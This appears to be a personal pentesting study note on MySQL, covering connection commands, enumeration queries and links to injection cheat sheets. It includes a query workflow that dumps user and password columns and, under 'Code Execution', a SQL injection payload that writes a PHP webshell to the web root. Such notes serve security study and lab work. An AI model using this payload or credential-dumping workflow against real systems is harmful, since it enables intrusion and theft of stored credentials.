---
tags:
  - "#type/tech-specific"
---
# Fundamentals

Common Database service, can be enumerated and exploited with metasploit

Metasploit: search for mysql/mysql_…

## Manual Connection

on kali use the `mysql`tool: `mysql -u <user> -p'<password>' -h <IP> -P 3306 `

- default port: `3306`
- to skip ssl certificate verification: `--skip-ssl-verify-server-cert`
Hint: in the mysql shell, end statements with `;`

## Cheat Sheets

- <https://devhints.io/mysql>
- [[2 Tech-Specifics/Database/Standard SQL Cheat Sheet|Standard SQL Cheat Sheet]]

| Function | Purpose |
|----------|--------------|
| `database()` | returns current database |
| `group_concat()` | gets specified column from multiple rows and puts it in one string |
| `LIMIT` | limit the number of results |

## Basic Enumeration

| Function            | Purpose            |
| ------------------- | ------------------ |
| `select version();` | Show dbms version  |
| `SHOW DATABASES;`   | Show databases     |
| `SHOW TABLES;`      | Show tables        |
| `DESCRIBE TABLE;`   | Get table metadata |

# Pentesting

## Injection

- Methodology: [[2 Tech-Specifics/Web/WebApp Attacks/Injection Attacks/SQL Injection|SQL Injection]]
- [MySQL injection cheat sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)

## Enumeration

**Workflow:**

1. List all Databases:
	- `SELECT schema_name FROM information_schema.schemata;`
2. List all tables in the current Database:
	- `SELECT table_name FROM information_schema.tables WHERE table_schema=database();`
3. List all Columns of a table:
	- `SELECT column_name FROM information_schema.columns WHERE table_name='users';`
4. Extract data or records:
	- `SELECT group_concat(user,';, passwd SEPARATOR ' \n\n') from users;`

## Code Execution

Use [SELECT INTO_OUTFILE](https://dev.mysql.com/doc/refman/8.0/en/select-into.html) to write the query result to a file

- e.g. write a webshell to a file and combine with [[2 Tech-Specifics/Web/WebApp Attacks/File Inclusion|File Inclusion]]
- e.g.: `' UNION SELECT "<?php system($_GET['cmd']);?>", null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //`

# Hardening
